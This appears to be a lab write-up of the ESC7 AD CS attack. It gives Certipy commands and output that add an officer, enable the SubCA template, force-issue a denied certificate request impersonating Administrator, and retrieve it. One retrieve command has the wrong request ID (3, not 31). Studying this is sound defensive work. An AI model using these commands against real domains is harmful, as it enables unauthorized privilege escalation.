---
description: Vulnerable Certificate Authority Access Control
---

# ESC7

A certificate authority holds a distinct set of permissions crucial for securing various CA functions.

* **CA Administrator (ManageCA right):** This role allows managing the CA's settings, including using the `ICertAdminD2::SetConfigEntry` method to adjust important configurations, like whether the CA accepts request attributes for Subject Alternative Names (SANs).
* **Certificate Manager (ManageCertificates right):** Also called a CA officer, this role focuses on managing issued certificates.

### <mark style="color:yellow;">Abuse from Linux - ManageCA rights</mark>

```sh
certipy find -u 'blwasp@lab.local' -p 'Password123!' -stdout -vulnerable

    [!] Vulnerabilities                        
      ESC7                              : 'LAB.LOCAL\\Black Wasp' has dangerous permissions
```

{% hint style="info" %}
Enabling `EDITF_ATTRIBUTESUBJECTALTNAME2` flag to perform `ESC6` attack, will not have any effect until the CA service (CertSvc) is restarted.
{% endhint %}

The `ManageCertificates` role allows us to approve pending certificate requests, which can be done with the ManageCA rights. Combining it with `ManageCertificates` roles, we can issue certificate requests that have failed.

`SubCA` template is also enabled by default. This template is vulnerable to `ESC1` but only permits `Domain Admins` and `Enterprise Admins` to enroll.

```sh
# Enable SubCA 
certipy ca -u 'BlWasp@lab.local' -p 'Password123!' -ca lab-LAB-DC-CA -enable-template 'SubCA'
```

{% hint style="info" %}
It is important to note that when executing certipy, if the output does not display the `ManageCertificates` rights, it indicates that the server's rights are set by default.
{% endhint %}

With ManageCA rights we assign ManageCertificate rights to any account.

```sh
certipy ca -u 'BlWasp@lab.local' -p 'Password123!' -ca lab-LAB-DC-CA -add-officer BlWasp
```

With the `SubCA` template enabled and with `ManageCertificates` rights, we can request a certificate by adding an alternative `SAN` and selecting the `SubCA` template.

```sh
mczen@htb[/htb]$ certipy req -u 'BlWasp@lab.local' -p 'Password123!' -ca lab-LAB-DC-CA -template SubCA -upn Administrator

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 31
Would you like to save the private key? (y/N) y
[*] Saved private key to 31.key
[-] Failed to request certificate
```

Error because we are not member of Domain Admins or Enterprise Admins. Save the request ID 31 and yes to save the key. With ManageCA and ManagerCertificates rights we issue the failed certificate request using certipy ca with -issue-request 31

```sh
mczen@htb[/htb]$ certipy ca -u 'BlWasp@lab.local' -p 'Password123!' -ca lab-LAB-DC-CA -issue-request 31
```

Retrieve the certificate with ID

```sh
certipy req -u 'BlWasp@lab.local' -p 'Password123!' -ca lab-LAB-DC-CA -retrieve 3
```

### <mark style="color:yellow;">Abuse from Linux - ManageCertificates rights</mark>

Request a certificate

```sh
mczen@htb[/htb]$ certipy req -u 'BlWasp@lab.local' -p 'Password123!' -ca lab-LAB-DC-CA -template ESC7_1 -upn Administrator
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[!] Certificate request is pending approval
[*] Request ID is 59
Would you like to save the private key? (y/N) y
[*] Saved private key to 59.key
[-] Failed to request certificate
```

It says the certificate request is pending approval, showing request ID 59. Save private key again and approve the request.

```sh
mczen@htb[/htb]$ certipy ca -u 'BlWasp@lab.local' -p 'Password123!' -ca lab-LAB-DC-CA -issue-request 59                                             
Certipy v4.8.2 - by Oliver Lyak (ly4k)                                                                                                            
                                                                                                                                                  
[*] Successfully issued certificate
```

Finally retrieve the approved request

```sh
certipy req -u 'BlWasp@lab.local' -p 'Password123!' -ca lab-LAB-DC-CA -retrieve 59             
```
